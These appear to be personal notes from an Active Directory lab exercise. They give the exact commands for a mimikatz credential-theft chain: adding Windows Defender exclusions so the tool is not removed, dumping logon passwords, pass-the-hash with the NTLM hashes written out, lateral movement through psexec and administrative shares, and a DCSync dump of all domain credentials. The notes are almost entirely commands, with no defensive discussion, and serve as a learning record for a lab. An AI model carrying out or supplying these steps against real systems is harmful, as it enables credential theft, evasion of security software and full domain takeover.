## mimikatz
- add exclusion for C:\ to windows defender
- set log file
    - `log C:\Users\normaluser\Downloads\mimi_client.txt`
- always need to run this first in order to run any sekurlsa command
    - `privilege::debug`
- get passwords
    - `sekurlsa::logonpasswords`
- look for `User Name         : Administrator`
    - Domain            : WIN10CLIENT
    - NTLM     : af992895db0f2c42a1bc96546e92804a
- pass the hash
    - the `/run:cmd.exe` part seems unneeded 
```
sekurlsa::pth /user:Administrator /domain:WIN10CLIENT /ntlm:af992895db0f2c42a1bc96546e92804a /run:cmd.exe
```
- dir \\192.168.56.30\C$

## win10adm
- get into win10adm with psexec
    - requires mimikatz terminal
    - `psexec -r teto /accepteula \\192.168.56.30 cmd.exe`
- get/set exclusion path for admin
    - `powershell -c "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath"`
    - `powershell -c "Add-MpPreference -ExclusionPath '%USERPROFILE%'"`
- this did not seem to help
    - `powershell -c "Add-MpPreference -ExclusionPath X:\"`
- get list of administrative shares
    - `net share`
- map default share and move to it
    - `net use x: \\192.168.56.30\C$`
    - `x:`
- seem to have more time if I copy it into a subfolder
    - `mkdir mimi`
    - `cd X:\Users\Administrator\mimi`
- copy from w10client to w10adm
    - `copy C:\Users\normaluser\Downloads\mimikatz\x64\* X:\Users\Administrator\mimi`
- 2nd mimikatz window:
    - `cd %userprofile%\mimikatz`
- open the file before windefender removes it
    - `mimikatz`
- get hash
    - `privilege::debug`
    - `sekurlsa::logonpasswords`
    - `log X:\Users\Administrator\mimikatz\mimi_adm.txt`
- had to log into win10_adm to get hashes to show up
    - domad showed up twice
    - NTLM     : cff48581d56085119bddffacfae51aeb

## win10_ad
- pass the hash
- `sekurlsa::pth /user:domad /domain:adlab.local /ntlm:cff48581d56085119bddffacfae51aeb`
- verify we have access to dc
- `dir \\192.168.56.10\C$`
- dont need to use psexec, just go deeper into mimikatz again
    - `privilege::debug`
    - `lsadump::dcsync /domain:adlab.local /all /csv`
- check which users are domain admins
    - `net group "domain admins" /domain`
